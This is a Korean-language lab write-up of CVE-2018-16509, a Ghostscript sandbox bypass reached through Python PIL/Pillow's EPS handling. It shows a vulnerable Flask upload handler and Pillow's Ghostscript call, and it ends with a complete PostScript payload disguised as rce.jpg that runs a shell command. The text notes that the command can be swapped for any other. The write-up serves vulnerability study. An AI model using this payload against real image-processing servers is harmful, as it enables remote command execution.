# Ghostscript CVE-2018-16509를 통한 Python PIL/Pillow 원격 셸 명령 실행

Ghostscript는 Adobe Systems PostScript 및 PDF(Portable Document Format) 페이지 설명 언어용 인터프리터 기반 소프트웨어이다. 

Ghostscript가 다른 소프트웨어(예: ImageMagick)의 종속되어서 설치되어 있기 때문에 응용 프로그램이 직접 사용하지 않더라도 프로덕션 서버(예: /usr/local/bin/gs 또는 /usr/bin/gs)에 Ghostscript가 존재한다. 
Ghostscript에는 많은 취약점이 발견되었는데, 그 중 하나는 CVE-2018-16509(Google Project Zero의 Tavis Ormandy에 의해 발견됨)이며, 이 취약점을 통해 v9.24 이전 버전에서는 Ghostscript의 -dSAFER bypass 공격이 임의 명령을 실행하여 LockSafetyParams를 비활성화하고 잘못된 액세스를 방지할 수 있다.
이 취약점은 Ghotscript wrapper가 있는 프로그래밍 언어의 ImageMagick 또는 image library와 같은 라이브러리를 통해 발견할 수 있다.

## 취약점
rce.jpg(실제 JPG가 아닌 특수 제작된 EPS 이미지)를 업로드하여 서버에서 touch /tmp/got_rce를 실행할 수 있다. 
docker exec [CONTER_ID] ls -alt /tmp를 실행해서 이를 볼 수 있다. CONTERNER_ID는 docker container ls로 확인할 수 있다.
셸 실행을 다른 명령으로 변경하려면 rce.jpg에서 직접 touch /tmp/got_rce를 변경하면 된다.

## 분석
oss-security에서 Tavis Ormandy의 취약점에 대한 설명을 참고할 수 있다.

PIL/Pillow의 소스코드 Ghostscript wrapper는 EPSImagePlugin.py 에서 확인할 수 있다.

취약한 코드 예시 `app.py`:

```python
@app.route('/', methods=['GET', 'POST'])
def upload_file():
    if request.method == 'POST':
        file = request.files.get('image', None)

        if not file:
            flash('No image found')
            return redirect(request.url)

        filename = file.filename
        ext = path.splitext(filename)[1]

        if (ext not in ['.jpg', '.jpeg', '.png', '.gif', '.bmp']):
            flash('Invalid extension')
            return redirect(request.url)

        tmp = tempfile.mktemp("test")
        img_path = "{}.{}".format(tmp, ext)

        file.save(img_path)

        img = Image.open(img_path)
        w, h = img.size
        ratio = 256.0 / max(w, h)

        resized_img = img.resize((int(w * ratio), int(h * ratio)))
        resized_img.save(img_path)
```
업로드된 파일의 내용은 img = Image.open(img_path)로 로드된다.
PIL이 이미지가 EPS 이미지인지 아닌지 자동으로 감지해준다(예: 파일 시작에 %!PS-Adobe-3.0 EPSF-3.0).
EPSImagePlugin.py 의 EpsImageFile 클래스에서 _open ()를 호출한다. 
IOError("cannot determine EPS bounding box")를 피하기 위해, 파일에 바운딩 박스를 추가해야 한다(예: %%BoundingBox: -0 -0 100).

EPS 이미지 본문은 Ghostscript 기능의 EPSImagePlugin.py 에서 볼 수 있듯이 하위 프로세스와 함께 Ghostscript binary로 처리된다.

```python
    # Build Ghostscript command
    command = ["gs",
               "-q",                         # quiet mode
               "-g%dx%d" % size,             # set output geometry (pixels)
               "-r%fx%f" % res,              # set input DPI (dots per inch)
               "-dBATCH",                    # exit after processing
               "-dNOPAUSE",                  # don't pause between pages
               "-dSAFER",                    # safe mode
               "-sDEVICE=ppmraw",            # ppm driver
               "-sOutputFile=%s" % outfile,  # output file
               "-c", "%d %d translate" % (-bbox[0], -bbox[1]),
                                             # adjust for image origin
               "-f", infile,                 # input file
               "-c", "showpage",             # showpage (see: https://bugs.ghostscript.com/show_bug.cgi?id=698272)
               ]


    ....

    try:
        with open(os.devnull, 'w+b') as devnull:
            startupinfo = None
            if sys.platform.startswith('win'):
                startupinfo = subprocess.STARTUPINFO()
                startupinfo.dwFlags |= subprocess.STARTF_USESHOWWINDOW
            subprocess.check_call(command, stdin=devnull, stdout=devnull,
                                  startupinfo=startupinfo)
```

위 코드는 `load`가 호출되었을 떄 호출된다. [Image.py](https://github.com/python-pillow/Pillow/blob/0adeb82e9886cdedb3917e8ddfaf46f69556a991/src/PIL/Image.py) 따라서 이미지를 단순히 여는 것만으로는 취약점이 발생하지 않는다. `resize`, `crop`, `rotate`, and `save` 등의 함수들이 `load` 를 호출하고 취약점을 유발한다.
Tavis Ormandy의 POC와 결합하여 원격 셸 명령 실행을 위한 rce.jpg를 제작할 수 있다.

```
%!PS-Adobe-3.0 EPSF-3.0
%%BoundingBox: -0 -0 100 100

userdict /setpagedevice undef
save
legal
{ null restore } stopped { pop } if
{ legal } stopped { pop } if
restore
mark /OutputFile (%pipe%touch /tmp/got_rce) currentdevice putdeviceprops
```